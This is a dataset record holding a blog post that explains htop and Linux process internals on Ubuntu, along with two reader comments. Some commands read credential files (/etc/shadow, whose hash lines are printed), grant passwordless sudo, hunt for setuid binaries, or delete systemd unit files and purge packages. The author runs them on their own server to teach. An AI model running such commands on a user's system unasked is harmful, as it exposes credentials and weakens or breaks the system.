/usr/sbin/acpid acpid - Advanced Configuration and Power Interface event daemon acpid is designed to notify user-space programs of ACPI events. acpid should be started during the system boot, and will run as a background process, by default. In computing, the Advanced Configuration and Power Interface (ACPI) specification provides an open standard that operating systems can use to perform discovery and configuration of computer hardware components, to perform power management by, for example, putting unused components to sleep, and to do status monitoring. But I'm on a virtual server that I don't intend to suspend/resume. I am going to remove it for fun and see what happens. sudo apt remove acpid -y --purge I was able to successfully reboot the droplet but after halt Digital Ocean thought it was still on so I had to Power Off using the web interface. So I should probably keep this. http://manpages.ubuntu.com/manpages/xenial/man8/acpid.8.html https://en.wikipedia.org/wiki/Advanced_Configuration_and_Power_Interface /usr/bin/lxcfs /var/lib/lxcfs/ Lxcfs is a fuse filesystem mainly designed for use by lxc containers. On a Ubuntu 15.04 system, it will be used by default to provide two things: first, a virtualized view of some /proc files; and secondly, filtered access to the hosts cgroup filesystems. In summary, on a 15.04 host, you can now create a container the usual way, lxc-create ... The resulting container will have correct results for uptime, top, etc. Its basically a userspace workaround to changes which were deemed unreasonable to do in the kernel. It makes containers feel much more like separate systems than they would without it. Not using LXC containers? You can remove it with sudo apt remove lxcfs -y --purge https://insights.ubuntu.com/2015/03/02/introducing-lxcfs/ https://www.stgraber.org/2016/03/31/lxcfs-2-0-has-been-released/ /usr/lib/accountservice/accounts-daemon The AccountsService package provides a set of D-Bus interfaces for querying and manipulating user account information and an implementation of these interfaces based on the usermod(8), useradd(8) and userdel(8) commands. When I removed DBus it broke timedatectl, I wonder what removing this service will break. sudo apt remove accountsservice -y --purge Time will tell. http://www.linuxfromscratch.org/blfs/view/systemd/gnome/accountsservice.html /sbin/mdadm mdadm is a Linux utility used to manage and monitor software RAID devices. The name is derived from the md (multiple device) device nodes it administers or manages, and it replaced a previous utility mdctl. The original name was \"Mirror Disk\", but was changed as the functionality increased. RAID is a method of using multiple hard drives to act as one. There are two purposes of RAID: 1) Expand drive capacity: RAID 0. If you have 2 x 500 GB HDD then total space become 1 TB. 2) Prevent data loss in case of drive failure: For example RAID 1, RAID 5, RAID 6, and RAID 10. You can remove it with sudo apt remove mdadm -y --purge https://en.wikipedia.org/wiki/Mdadm https://help.ubuntu.com/community/Installation/SoftwareRAID http://manpages.ubuntu.com/manpages/xenial/man8/mdadm.8.html /usr/lib/policykit-1/polkitd --no-debug polkitd PolicyKit daemon polkit - Authorization Framework My understanding is that this is like fine-grained sudo. You can allow non privilegded users to do certain actions as root. For instance, reboot your computer when you're running Linux on a desktop computer. But I'm running a server. You can remove it with sudo apt remove policykit-1 -y --purge Still wondering if this breaks something. http://manpages.ubuntu.com/manpages/xenial/man8/polkitd.8.html http://manpages.ubuntu.com/manpages/xenial/man8/polkit.8.html http://www.admin-magazine.com/Articles/Assigning-Privileges-with-sudo-and-PolicyKit https://wiki.archlinux.org/index.php/Polkit#Configuration /usr/sbin/sshd -D sshd (OpenSSH Daemon) is the daemon program for ssh. -D When this option is specified, sshd will not detach and does not become a daemon. This allows easy monitoring of sshd. http://manpages.ubuntu.com/manpages/xenial/man8/sshd.8.html /sbin/iscsidiscsid is the daemon (system service) that runs in the background, acting on iSCSI configuration, and managing the connections. From its manpage: The iscsid implements the control path of iSCSI protocol, plus some management facilities. For example, the daemon could be configured to automatically re-start discovery at startup, based on the contents of persistent iSCSI database. http://unix.stackexchange.com/questions/216239/iscsi-vs-iscsid-services I had never heard of iSCSI: In computing, iSCSI (Listeni/askzi/ eye-skuz-ee) is an acronym for Internet Small Computer Systems Interface, an Internet Protocol (IP)-based storage networking standard for linking data storage facilities. By carrying SCSI commands over IP networks, iSCSI is used to facilitate data transfers over intranets and to manage storage over long distances. iSCSI can be used to transmit data over local area networks (LANs), wide area networks (WANs), or the Internet and can enable location-independent data storage and retrieval. The protocol allows clients (called initiators) to send SCSI commands (CDBs) to SCSI storage devices (targets) on remote servers. It is a storage area network (SAN) protocol, allowing organizations to consolidate storage into data center storage arrays while providing hosts (such as database and web servers) with the illusion of locally attached disks. You can remove it with sudo apt remove open-iscsi -y --purge /sbin/agetty --noclear tty1 linux agetty - alternative Linux getty getty, short for \"get tty\", is a Unix program running on a host computer that manages physical or virtual terminals (TTYs). When it detects a connection, it prompts for a username and runs the 'login' program to authenticate the user. Originally, on traditional Unix systems, getty handled connections to serial terminals (often Teletype machines) connected to a host computer. The tty part of the name stands for Teletype, but has come to mean any type of text terminal. This allows you to log in when you are physically at the server. In Digital Ocean, you can click on Console in the droplet details and you will be able to interact with this terminal in your browser (it's a VNC connection I think). In the old days, you'd see a bunch of ttys started a system boot (configured in /etc/inittab), but nowadays they are spun up on demand by systemd. For fun, I removed this configuration file that launches and generates agetty: sudo rm /etc/systemd/system/getty.target.wants/[emailprotected] sudo rm /lib/systemd/system/getty@.service When I rebooted the server, I could still connect to it via SSH but I was no longer able to log in from the Digital Ocean web console. http://manpages.ubuntu.com/manpages/xenial/man8/getty.8.html https://en.wikipedia.org/wiki/Getty_(Unix) http://0pointer.de/blog/projects/serial-console.html http://unix.stackexchange.com/questions/56531/how-to-get-fewer-ttys-with-systemd sshd: [emailprotected]/0 means that there has been an SSH session established for the user root at the #0 pseudoterminal (pts). A pseudoterminal emulates a real text terminal. bash is the shell that I am using. Why is there a dash at the beginning? Reddit user hirnbrot helpfully explained it: There's a dash at the beginning because launching it as \"-bash\" will make it a login shell. A login shell is one whose first character of argument zero is a -, or one started with the --login option. This will then cause it to read a different set of configuration files. htop is an interactive process viewer tool that is running in the screenshot. Aftersudo apt remove lvm2 -y --purge sudo apt remove at -y --purge sudo apt remove snapd -y --purge sudo apt remove lxcfs -y --purge sudo apt remove mdadm -y --purge sudo apt remove open-iscsi -y --purge sudo apt remove accountsservice -y --purge sudo apt remove policykit-1 -y --purge Extreme edition: sudo apt remove dbus -y --purge sudo apt remove rsyslog -y --purge sudo apt remove acpid -y --purge sudo systemctl stop cron && sudo systemctl disable cron sudo rm /etc/systemd/system/getty.target.wants/[emailprotected] sudo rm /lib/systemd/system/getty@.service I followed the instructions in my blog post about unattended installation of WordPress on Ubuntu Server and it works. Here's nginx, PHP7 and MySQL. AppendixSource codeSometimes looking at strace is not enough. Another way to figure out what a program does is to look at its source code. First, I need to find out where to start looking. $ which uptime /usr/bin/uptime $ dpkg -S /usr/bin/uptime procps: /usr/bin/uptime Here we find out that uptime is actually located at /usr/bin/uptime and that on Ubuntu it is part of the procps package. You can then go to packages.ubuntu.com and search for the package there. Here is the page for procps: http://packages.ubuntu.com/source/xenial/procps If you scroll to the bottom of the page, you'll see links to the source code repositories: Debian Package Source Repository git://git.debian.org/collab-maint/procps.git Debian Package Source Repository (Browsable) https://anonscm.debian.org/cgit/collab-maint/procps.git/ File descriptors and redirectionWhen you want to redirect standard error (stderr) to standard output (stdout), is it 2&>1 or 2>&1? You can memorize where the ampersand & goes by knowing that echo something > file will write something to the file file. It's the same as echo something 1> file. Now, echo something 2> file will write the stderr output to file. If you write echo something 2>1, it means that you redirect stderr to a file with the name 1. Add spaces to make it more clear: echo something 2> 1. If you add & before 1, it means that 1 is not a filename but the stream ID. So it's echo something 2>&1. Colors in PuTTY If you have missing elements in htop when you are using PuTTY, here is how to solve it. Right click on the title bar Click Change settings... Go to Window -> Colours Select the Both radio button Click Apply Shell in CLet's write a very simple shell in C that demonstrates the use of fork/exec/wait system calls. Here's the program shell.c. #include <stdio.h> #include <stdlib.h> #include <unistd.h> #include <string.h> #include <sys/wait.h> int main() { printf(\"Welcome to my shell\\n\"); char line[1024]; while (1) { printf(\"> \"); fgets(line, sizeof(line), stdin); line[strlen(line)-1] = '\\0'; // strip \\n if (strcmp(line, \"exit\") == 0) // shell built-in break; int pid = fork(); if (pid == 0) { printf(\"Executing: %s\\n\", line); if (execlp(line, \"\", NULL) == -1) { printf(\"ERROR!\\n\"); exit(1); } } else if (pid > 0) { int status; waitpid(pid, &status, 0); printf(\"Child exited with %d\\n\", WEXITSTATUS(status)); } else { printf(\"ERROR!\\n\"); break; } } return 0; } Compile the program. gcc shell.c -o shell And run it. $ ./shell Welcome to my shell > date Executing: date Thu Dec 1 14:10:59 UTC 2016 Child exited with 0 > true Executing: true Child exited with 0 > false Executing: false Child exited with 1 > exit Have you ever wondered that when you launch a process in the background you only see that it has exited only after a while when you hit Enter? $ sleep 1 & [1] 11686 $ # press Enter [1]+ Done sleep 1 That's because the shell is waiting for your input. Only when you enter a command does it check for the status of the background processes and show if they've been terminated. TODOHere is what I'd like to find out more about. process state substatuses (Ss, Ss+, R+, etc.) kernel threads /dev/pts more about memory (CODE, DATA, SWAP) figure out time slices length Linux scheduler algorithm pinning proceses to cores write about manual pages cpu/memory colors in bars process ID limit & fork bomb lsof, ionice, schedtool UpdatesHere is a list of non-minor corrections and updates since the post was published. Idle time in /proc/uptime is the sum of all cores (Dec 2, 2016) My parent/child printf in zombie.c was reversed (Dec 2, 2016) apt remove cron installs postfix because of a dependency to an MTA (Dec 3, 2016) id can load information from other sources (via /etc/nsswitch.conf), not just /etc/passwd (Dec 3, 2016) Describe /etc/shadow password hash format (Dec 3, 2016) Use visudo to edit the /etc/sudoers file to be safe (Dec 3, 2016) Explain MEM% (Dec 3, 2016) Rewrite the section about load averages (Dec 4, 2016) Fix: kill 1234 by default sends TERM not INT (Dec 7, 2016) Explain CPU and memory color bars (Dec 7, 2016) Please let me know if there is something wrong in this post! I will gladly correct it. T-shirtCongratulations on making to the end. Here's another screenshot of htop. This time it's of a human. It displays your inner processes and the load of your kernel. Get this t-shirt for yourself or as a gift. It's been bought 44 times already (including hoodies, etc.) ",
          "One of my favorite things about htop are some of the projects that have been created that are modeled after htop but focus on information other than system resources.<p>Cointop [0] is one of these projects that comes to mind.<p>[0] <a href=\"https://github.com/miguelmota/cointop\" rel=\"nofollow\">https://github.com/miguelmota/cointop</a>",
          "The problem with htop on Linux is that once there are 200+ processes running on the system htop takes significant portion of CPU time and utilization. This is because htop has to go through each process entry in procfs (open, read, close) every second and parse the text context instead of just calling appropriate syscall like on the OpenBSD and friends to retrieve such information.<p>It would help if kernel provided process information in binary form instead of serializing it into text. Or even better to provide specific syscalls for it like on macOS, Windows, OpenBSD, Solaris and others."
        ],
        "story_type": ["Normal"],
        "url": "https://peteris.rocks/blog/htop/",
        "comments.comment_id": [21415410, 21417085],
        "comments.comment_author": ["shanecoin", "for_xyz"],
        "comments.comment_descendants": [6, 8],
        "comments.comment_time": [
          "2019-11-01T01:08:49Z",
          "2019-11-01T08:39:47Z"
        ],
        "comments.comment_text": [
          "One of my favorite things about htop are some of the projects that have been created that are modeled after htop but focus on information other than system resources.<p>Cointop [0] is one of these projects that comes to mind.<p>[0] <a href=\"https://github.com/miguelmota/cointop\" rel=\"nofollow\">https://github.com/miguelmota/cointop</a>",
          "The problem with htop on Linux is that once there are 200+ processes running on the system htop takes significant portion of CPU time and utilization. This is because htop has to go through each process entry in procfs (open, read, close) every second and parse the text context instead of just calling appropriate syscall like on the OpenBSD and friends to retrieve such information.<p>It would help if kernel provided process information in binary form instead of serializing it into text. Or even better to provide specific syscalls for it like on macOS, Windows, OpenBSD, Solaris and others."
        ],
        "id": "7ecce170-0776-45ad-95c9-fc11228895ba",
        "url_text": "For the longest time I did not know what everything meant in htop. I thought that load average 1.0 on my two core machine means that the CPU usage is at 50%. That's not quite right. And also, why does it say 1.0? I decided to look everything up and document it here. They also say that the best way to learn something is to try to teach it. Table of Contents htop on Ubuntu Server 16.04 x64UptimeLoad averageProcessesProcess ID / PIDProcess treeProcess userProcess stateR - running or runnable (on run queue)S - interruptible sleep (waiting for an event to complete)D - uninterruptible sleep (usually IO)Z - defunct (\"zombie\") process, terminated but not reaped by its parentT - stopped by job control signalt - stopped by debugger during the tracingProcess timeProcess niceness and priorityMemory usage - VIRT/RES/SHR/MEMVIRT/VSZ - Virtual ImageRES/RSS - Resident sizeSHR - Shared Mem sizeMEM% - Memory usageProcessesBefore/sbin/init/lib/systemd/systemd-journald/sbin/lvmetad -f/lib/systemd/udevd/lib/systemd/timesyncd/usr/sbin/atd -f/usr/lib/snapd/snapd/usr/bin/dbus-daemon/lib/systemd/systemd-logind/usr/sbin/cron -f/usr/sbin/rsyslogd -n/usr/sbin/acpid/usr/bin/lxcfs /var/lib/lxcfs//usr/lib/accountservice/accounts-daemon/sbin/mdadm/usr/lib/policykit-1/polkitd --no-debug/usr/sbin/sshd -D/sbin/iscsid/sbin/agetty --noclear tty1 linuxsshd: [emailprotected]/0 & -bash & htopAfterAppendixSource codeFile descriptors and redirectionColors in PuTTYShell in CTODOUpdatesFinal remarksT-shirt htop on Ubuntu Server 16.04 x64Here is a screenshot of htop that I am going to describe. UptimeUptime shows how long the system has been running. You can see the same information by running uptime: $ uptime 12:17:58 up 111 days, 31 min, 1 user, load average: 0.00, 0.01, 0.05 How does the uptime program know that? It reads the information from the file /proc/uptime. 9592411.58 9566042.33 The first number is the total number of seconds the system has been up. The second number is how much of that time the machine has spent idle, in seconds The second value may be greater than the overall system uptime on systems with multiple cores since it is a sum. How did I know that? I looked at what files the uptime program opens when it is run. We can use the strace tool to do that. strace uptime There will be a lot of output. We can grep for the open system call. But that will not really work since strace outputs everything to the standard error (stderr) stream. We can redirect the stderr to the standard output (stdout) stream with 2>&1. Our output is this: $ strace uptime 2>&1 | grep open ... open(\"/proc/uptime\", O_RDONLY) = 3 open(\"/var/run/utmp\", O_RDONLY|O_CLOEXEC) = 4 open(\"/proc/loadavg\", O_RDONLY) = 4 which contains the file /proc/uptime which I mentioned. It turns out that you can also use strace -e open uptime and not bother with grepping. So why do we need the uptime program if we can just read the contents of the file? The uptime output is nicely formatted for humans whereas the number of seconds is more useful for using in your own programs or scripts. Load averageIn addition to uptime, there were also three numbers that represent the load average. $ uptime 12:59:09 up 32 min, 1 user, load average: 0.00, 0.01, 0.03 They are taken from the /proc/loadavg file. If you take another look at the strace output, you'll see that this file was also opened. $ cat /proc/loadavg 0.00 0.01 0.03 1/120 1500 The first three columns represent the average system load of the last 1, 5, and 15 minute periods. The fourth column shows the number of currently running processes and the total number of processes. The last column displays the last process ID used. Let's start with the last number. Whenever you launch a new process, it is assigned an ID number. Process IDs are usually increasing, unless they've been exausted and are being reused. The process ID of 1 belongs to /sbin/init which is started at boot time. Let's look at the /proc/loadavg contents again and then launch the sleep command in the background. When it's launched in the background, its process ID will be shown. $ cat /proc/loadavg 0.00 0.01 0.03 1/123 1566 $ sleep 10 & [1] 1567 So the 1/123 means that there is one process running or ready to run at this time and there are 123 processed in total. When you run htop and see just one running process, it means that it is the htop process itself. If you run sleep 30 and run htop again, you'll notice that there is still just 1 running process. That's because sleep is not running, it is sleeping or idling or in other words waiting for something to happen. A running process is a process that is currently running on the physical CPU or waiting its turn to run on the CPU. If you run cat /dev/urandom > /dev/null which repeatedly generates random bytes and writes them to a special file that is never read from, you will see that there are now two running process. $ cat /dev/urandom > /dev/null & [1] 1639 $ cat /proc/loadavg 1.00 0.69 0.35 2/124 1679 So there are now two running processes (random number generation and the cat that reads the contents of /proc/loadavg) and you'll also notice that the load averages have increased. The load average represents the average system load over a period of time. The load number is calculated by counting the number of running (currently running or waiting to run) and uninterruptible processes (waiting for disk or network activity). So it's simply a number of processes. The load averages are then the average number of those processes during the last 1, 5 and 15 minutes, right? It turns out it's not as simple as that. The load average is the exponentially damped moving average of the load number. From Wikipedia: Mathematically speaking, all three values always average all the system load since the system started up. They all decay exponentially, but they decay at different speed. Hence, the 1-minute load average will add up 63% of the load from last minute, plus 37% of the load since start up excluding the last minute. Therefore, it's not technically accurate that the 1-minute load average only includes the last 60 seconds activity (since it still includes 37% activity from the past), but that includes mostly the last minute. Is that what you expected? Let's return to our random number generation. $ cat /proc/loadavg 1.00 0.69 0.35 2/124 1679 While technically not correct, this is how I simplify load averages to make it easier to reason about them. In this case, the random number generation process is CPU bound, so the load average over the last minute is 1.00 or on average 1 running process. Since there is only one CPU on my system, the CPU utilization is 100% since my CPU can run only one process at a time. If I had two cores, my CPU usage would be 50% since my computer can run two processes at the same time. The load average of a computer with 2 cores that has a 100% CPU utilization would be 2.00. You can see the number of your cores or CPUs in the top left corner of htop or by running nproc. Because the load number also includes processes in uninterruptible states which don't have much effect on CPU utilization, it's not quite correct to infer CPU usage from load averages like I just did. This also explains why you may see high load averages but not much load on the CPU. But there are tools like mpstat that can show the instantaneous CPU utilization. $ sudo apt install sysstat -y $ mpstat 1 Linux 4.4.0-47-generic (hostname) 12/03/2016 _x86_64_ (1 CPU) 10:16:20 PM CPU %usr %nice %sys %iowait %irq %soft %steal %guest %gnice %idle 10:16:21 PM all 0.00 0.00 100.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 10:16:22 PM all 0.00 0.00 100.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 10:16:23 PM all 0.00 0.00 100.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 # ... # kill cat /dev/urandom # ... 10:17:00 PM all 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 100.00 10:17:01 PM all 1.00 0.00 0.00 2.00 0.00 0.00 0.00 0.00 0.00 97.00 10:17:02 PM all 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 100.00 Why do we use load averages then? $ curl -s https://raw.githubusercontent.com/torvalds/linux/v4.8/kernel/sched/loadavg.c | head -n 7 /* * kernel/sched/loadavg.c * * This file contains the magic bits required to compute the global loadavg * figure. Its a silly number but people think its important. We go through * great pains to make it work on big machines and tickless kernels. */ ProcessesIn the top right corner, htop shows the total number of processes and how many of them are running. But it says Tasks not processes. Why? Another name for a process is a task. The Linux kernel internally refers to processes as tasks. htop uses Tasks instead of Processes probably because it's shorter and saves some screen space. You can also see threads in htop. To toggle the visibility of threads, hit Shift+H on your keyboard. If you see Tasks: 23, 10 thr, it means it they are visible. You can also see kernel threads with Shift+K. When they are visible, it'll say Tasks: 23, 40 kthr. Process ID / PIDEvery time a new process is started it is assigned an identification number (ID) which is called process ID or PID for short. If you run a program in the background (&) from bash, you will see the job number in square brackets and the PID. $ sleep 1000 & [1] 12503 If you missed it, you can use the $! variable in bash that will expand to the last backgrounded process ID. $ echo $! 12503 Process ID is very useful. It can be used to see details about the process and to control it. procfs is a pseudo file system that lets userland programs to get information from the kernel by reading files. It is usually mounted at /proc/ and to you it looks like a regular directory that you can browse with ls and cd. All information related to a process is located at /proc/<pid>/. $ ls /proc/12503 attr coredump_filter fdinfo maps ns personality smaps task auxv cpuset gid_map mem numa_maps projid_map stack uid_map cgroup cwd io mountinfo oom_adj root stat wchan clear_refs environ limits mounts oom_score schedstat statm cmdline exe loginuid mountstats oom_score_adj sessionid status comm fd map_files net pagemap setgroups syscall For example, /proc/<pid>/cmdline will give the command that was used to launch the process. $ cat /proc/12503/cmdline sleep1000$ Ugh, that's not right. It turns out that the command is separated by the \\0 byte. $ od -c /proc/12503/cmdline 0000000 s l e e p \\0 1 0 0 0 \\0 0000013 which we can replace with a space or newline $ tr '\\0' '\\n' < /proc/12503/cmdline sleep 1000 $ strings /proc/12503/cmdline sleep 1000 The process directory for a process can contain links! For instance, cwd points to the current working directory and exe is the executed binary. $ ls -l /proc/12503/{cwd,exe} lrwxrwxrwx 1 ubuntu ubuntu 0 Jul 6 10:10 /proc/12503/cwd -> /home/ubuntu lrwxrwxrwx 1 ubuntu ubuntu 0 Jul 6 10:10 /proc/12503/exe -> /bin/sleep So this is how htop, top, ps and other diagnostic utilities get their information about the details of a process: they read it from /proc/<pid>/<file>. Process treeWhen you launch a new process, the process that launched the new process is called the parent process. The new process is now a child process for the parent process. These relationships form a tree structure. If you hit F5 in htop, you can see the process hierarchy. You can also use the f switch with ps $ ps f PID TTY STAT TIME COMMAND 12472 pts/0 Ss 0:00 -bash 12684 pts/0 R+ 0:00 \\_ ps f or pstree $ pstree -a init atd cron sshd -D sshd sshd bash pstree -a ... If you have ever wondered why you often see bash or sshd as parents of some of your processes, here's why. This is what happens when you run, say, date from your bash shell: bash creates a new process that is a copy of itself (using a fork system call) it will then load the program from the executable file /bin/date into memory (using an exec system call) bash as the parent process will wait for its child to exit So the /sbin/init with an ID of 1 was started at boot, which spawned the SSH daemon sshd. When you connect to the computer, sshd will spawn a process for the session which in turn will launch the bash shell. I like to use this tree view in htop when I'm also interested in seeing all threads. Process userEach process is owned by a user. Users are represented with a numeric ID. $ sleep 1000 & [1] 2045 $ grep Uid /proc/2045/status Uid: 1000 1000 1000 1000 You can use the id command to find out the name for this user. $ id 1000 uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm) It turns out that id gets this information from the /etc/passwd and /etc/group files. $ strace -e open id 1000 ... open(\"/etc/nsswitch.conf\", O_RDONLY|O_CLOEXEC) = 3 open(\"/lib/x86_64-linux-gnu/libnss_compat.so.2\", O_RDONLY|O_CLOEXEC) = 3 open(\"/lib/x86_64-linux-gnu/libnss_files.so.2\", O_RDONLY|O_CLOEXEC) = 3 open(\"/etc/passwd\", O_RDONLY|O_CLOEXEC) = 3 open(\"/etc/group\", O_RDONLY|O_CLOEXEC) = 3 ... That's because the Name Service Switch (NSS) configuration file /etc/nsswitch.conf says to use these files to resolve names. $ head -n 9 /etc/nsswitch.conf # ... passwd: compat group: compat shadow: compat The value of compat (Compatibility mode) is the same as files except other special entries are permitted. files means that the database is stored in a file (loaded by libnss_files.so). But you could also store your users in other databases and services or use Lightweight Directory Access Protocol (LDAP), for example. /etc/passwd and /etc/group are plain text files that map numeric IDs to human readable names. $ cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash $ cat /etc/group root:x:0: adm:x:4:syslog,ubuntu ubuntu:x:1000: passwd? But where are the passwords? They are actually in /etc/shadow. $ sudo cat /etc/shadow root:$6$mS9o0QBw$P1ojPSTexV2PQ.Z./rqzYex.k7TJE2nVeIVL0dql/:17126:0:99999:7::: daemon:*:17109:0:99999:7::: ubuntu:$6$GIfdqlb/$ms9ZoxfrUq455K6UbmHyOfz7DVf7TWaveyHcp.:17126:0:99999:7::: What's that gibberish? $6$ is the password hashing algorithm used, in this case it stands for sha512 followed by randomly generated salt to safeguard against rainbow table attacks and finally the hash of your password + salt When you run a program, it will be run as your user. Even if the executable file is not owned by you. If you'd like to run a program as root or another user, that's what sudo is for. $ id uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm) $ sudo id uid=0(root) gid=0(root) groups=0(root) $ sudo -u ubuntu id uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm) $ sudo -u daemon id uid=1(daemon) gid=1(daemon) groups=1(daemon) But what if you want to log in as another user to launch various commands? Use sudo bash or sudo -u user bash. You'll be able to use the shell as that user. If you don't like being asked for the root password all the time, you can simply disable it by adding your user to the /etc/sudoers file. Let's try it: $ echo \"$USER ALL=(ALL) NOPASSWD: ALL\" >> /etc/sudoers -bash: /etc/sudoers: Permission denied Right, only root can do it. $ sudo echo \"$USER ALL=(ALL) NOPASSWD: ALL\" >> /etc/sudoers -bash: /etc/sudoers: Permission denied WTF? What happens here is that you are executing the echo command as root but appending the line to the /etc/sudoers file still as your user. There are usually two ways around it: echo \"$USER ALL=(ALL) NOPASSWD: ALL\" | sudo tee -a /etc/sudoers sudo bash -c \"echo '$USER ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers\" In the first case, tee -a will append its standard input to the file and we execute this command as root. In the second case, we run bash as root and ask it to execute a command (-c) and the entire command will be executed as root. Note the tricky \"/' business here which will dictate when the $USER variable will be expanded. If you take a look at the /etc/sudoers file you will see that it begins with $ sudo head -n 3 /etc/sudoers # # This file MUST be edited with the 'visudo' command as root. # Uh oh. It's a helpful warning that says you should edit this file with sudo visudo. It will validate the contents of the file before saving and prevent you from making mistakes. If you don't use visudo and make a mistake, it may lock you out from sudo. Which means that you won't be able to correct your mistake! Let's say you want to change your password. You can do it with the passwd command. It will, as we saw earlier, save the password to the /etc/shadow file. This file is sensitive and only writeable by root: $ ls -l /etc/shadow -rw-r----- 1 root shadow 1122 Nov 27 18:52 /etc/shadow So how is it possible that the passwd program which is executed by a regular user can write to a protected file? I said earlier that when you launch a process, it is owned by you, even if the owner of the executable file is another user. It turns out that you can change that behavior by changing file permissions. Let's take a look. $ ls -l /usr/bin/passwd -rwsr-xr-x 1 root root 54256 Mar 29 2016 /usr/bin/passwd Notice the s letter. It was accomplished with sudo chmod u+s /usr/bin/passwd. It means that an executable will be launched as the the owner of the file which is root in this case. You can find the so called setuid executables with find /bin -user root -perm -u+s. Note that you can also do the same with group (g+s). Process stateWe are next going to look at the process state column in htop which is denoted simply with the letter S. Here are the possible values: R running or runnable (on run queue) S interruptible sleep (waiting for an event to complete) D uninterruptible sleep (usually IO) Z defunct (\"zombie\") process, terminated but not reaped by its parent T stopped by job control signal t stopped by debugger during the tracing X dead (should never be seen) I've ordered them by how often I see them. Note that when you run ps, it will also show substates like Ss, R+, Ss+, etc. $ ps x PID TTY STAT TIME COMMAND 1688 ? Ss 0:00 /lib/systemd/systemd --user 1689 ? S 0:00 (sd-pam) 1724 ? S 0:01 sshd: [emailprotected]pts/0 1725 pts/0 Ss 0:00 -bash 2628 pts/0 R+ 0:00 ps x R - running or runnable (on run queue)In this state, the process is currently running or on a run queue waiting to run. What does it mean to run? When you compile the source code of a program that you've written, that machine code is CPU instructions. It is saved to a file that can be executed. When you launch a program, it is loaded into memory and then the CPU executes these instructions. Basically it means that the CPU is physically executing instructions. Or, in other words, crunching numbers. S - interruptible sleep (waiting for an event to complete)This means that the code instructions of this process are not being executed on the CPU. Instead, this process is waiting for something - an event or a condition - to happen. When an event happens, the kernel sets the state to running. One example is the sleep utily from coreutils. It will sleep for a specific number of seconds (approximately). $ sleep 1000 & [1] 10089 $ ps f PID TTY STAT TIME COMMAND 3514 pts/1 Ss 0:00 -bash 10089 pts/1 S 0:00 \\_ sleep 1000 10094 pts/1 R+ 0:00 \\_ ps f So this is interruptible sleep. How can we interrupt it? By sending a signal. You can send a signal in htop by hitting F9 and then choosing one of the signals in the menu on the left. Sending a signal is also known as kill. That's because kill is a system call that can send a signal to a process. There is a program /bin/kill that can make this system call from userland and the default signal to use is TERM which will ask the process to terminate or in other words try to kill it. Signal is just a number. Numbers are hard to remember so we give them names. Signal names are usually written in uppercase and may be prefixed with SIG. Some commonly used signals are INT, KILL, STOP, CONT, HUP. Let's interrupt the sleep process by sending the INT aka SIGINT aka 2 aka Terminal interrupt signal. $ kill -INT 10089 [1]+ Interrupt sleep 1000 This is also what happens When you hit CTRL+C on your keyboard. bash will the send the foreground process the SIGINT signal just like we just did manually. By the way, in bash, kill is a built-in command, even though there is /bin/kill on most systems. Why? It allows processes to be killed if the limit on processes that you can create is reached. These commands do the same thing: kill -INT 10089 kill -2 10089 /bin/kill -2 10089 Another useful signal to know is SIGKILL aka 9. You may have used it to kill a process that didn't respond to your frantic CTRL+C keyboard presses. When you write a program, you can set up signal handlers that are functions that will be called when your process receives a signal. In other words, you can catch the signal and then do something, for example, clean up and shut down gracefully. So sending SIGINT (the user wants to interrupt a process) and SIGTERM (the user wants to terminate the process) does not mean that the process will be terminated. You may have seen this exception when running Python scripts: $ python -c 'import sys; sys.stdin.read()' ^C Traceback (most recent call last): File \"<string>\", line 1, in <module> KeyboardInterrupt You can tell the kernel to forcefully terminate a process and not give it a change to respond by sending the KILL signal: $ sleep 1000 & [1] 2658 $ kill -9 2658 [1]+ Killed sleep 1000 D - uninterruptible sleep (usually IO)Unlike interruptible sleep, you cannot wake up this process with a signal. That is why many people dread seeing this state. You can't kill such processes because killing means sending SIGKILL signals to processes. This state is used if the process must wait without interruption or when the event is expected to occur quickly. Like reading to/from a disk. But that should only happen for a fraction of a second. Here is a nice answer on StackOverflow. Uninterruptable processes are USUALLY waiting for I/O following a page fault. The process/task cannot be interrupted in this state, because it can't handle any signals; if it did, another page fault would happen and it would be back where it was. In other words, this could happen if you are using Network File System (NFS) and it takes a while to read and write from it. Or in my experience it can also mean that some of the processes are swapping a lot which means you have too little available memory. Let's try to get a process to go into uninterruptible sleep. 8.8.8.8 is a public DNS server provided by Google. They do not have an open NFS on there. But that won't stop us. $ sudo mount 8.8.8.8:/tmp /tmp & [1] 12646 $ sudo ps x | grep mount.nfs 12648 pts/1 D 0:00 /sbin/mount.nfs 8.8.8.8:/tmp /tmp -o rw How to find out what's causing this? strace! Let's strace the command in the output of ps above. $ sudo strace /sbin/mount.nfs 8.8.8.8:/tmp /tmp -o rw ... mount(\"8.8.8.8:/tmp\", \"/tmp\", \"nfs\", 0, ... So the mount system call is blocking the process. If you're wondering, you can run mount with an intr option to run as interruptible: sudo mount 8.8.8.8:/tmp /tmp -o intr. Z - defunct (\"zombie\") process, terminated but not reaped by its parentWhen a process ends via exit and it still has child processes, the child processes become zombie processes. If zombie processes exist for a short time, it is perfectly normal Zombie processes that exist for a long time may indicate a bug in a program Zombie processes don't consume memory, just a process ID You can't kill a zombie process You can ask nicely the parent process to reap the zombies (the SIGCHLD signal) You can kill the zombie's parent process to get rid of the parent and its zombies I am going to write some C code to show this. Here is our program. #include <stdio.h> #include <stdlib.h> #include <unistd.h> int main() { printf(\"Running\\n\"); int pid = fork(); if (pid == 0) { printf(\"I am the child process\\n\"); printf(\"The child process is exiting now\\n\"); exit(0); } else { printf(\"I am the parent process\\n\"); printf(\"The parent process is sleeping now\\n\"); sleep(20); printf(\"The parent process is finished\\n\"); } return 0; } Let's install the GNU C Compiler (GCC). sudo apt install -y gcc Compile it and then run it gcc zombie.c -o zombie ./zombie Look at the process tree $ ps f PID TTY STAT TIME COMMAND 3514 pts/1 Ss 0:00 -bash 7911 pts/1 S+ 0:00 \\_ ./zombie 7912 